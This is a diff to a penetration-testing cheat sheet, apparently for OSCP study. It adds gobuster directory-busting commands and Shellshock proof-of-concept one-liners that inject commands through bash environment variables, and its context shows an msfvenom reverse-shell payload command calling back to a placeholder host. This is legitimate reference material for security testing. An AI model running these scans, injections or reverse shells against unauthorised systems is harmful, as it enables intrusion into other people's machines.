@@ -125,6 +125,14 @@ To execute it create a probe `Debugging & Logging` -> `System probes` -> URL=<so
 <cfdump var="#env#">
 ```
 
+### dir busting
+
+* generic dirbusting
+`gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt`
+
+* fuzz some cgi
+`gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200`
+
 ## Reverse Shell Howto
 
 * Bash     
@@ -411,6 +419,22 @@ For all shellcode see `msfvenom –help-formats` for information as to valid par
 * Mac Based Shellcode     
 `msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>`
 
+## Shellshock
+
+* CVE-2014-6271    
+`env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id`
+
+* CVE-2014-7169     
+`env X='() { (a)=>\' bash -c "echo date"; cat echo`
+
+* CVE-2014-7186    
+`bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' || echo "CVE-2014-7186 vulnerable, redir_stack"`
+
+* CVE-2014-7187
+`(for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash || echo "CVE-2014-7187 vulnerable, word_lineno"` 
+
+* CVE-2014-6278
+`env X='() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }' bash -c :` 
 
 ## References
 * [OSCP Exam Guide](https://support.offensive-security.com/#!oscp-exam-guide.md) - MUST read!
@@ -429,3 +453,4 @@ For all shellcode see `msfvenom –help-formats` for information as to valid par
 * [Useful Linux commands](https://highon.coffee/blog/linux-commands-cheat-sheet/)
 * [Local Linux Enumeration](https://www.rebootuser.com/?p=1623)
 * [Creating Metasploid Payloads](https://netsec.ws/?p=331)
+* [Shellshock PoCs](https://github.com/mubix/shellshocker-pocs)
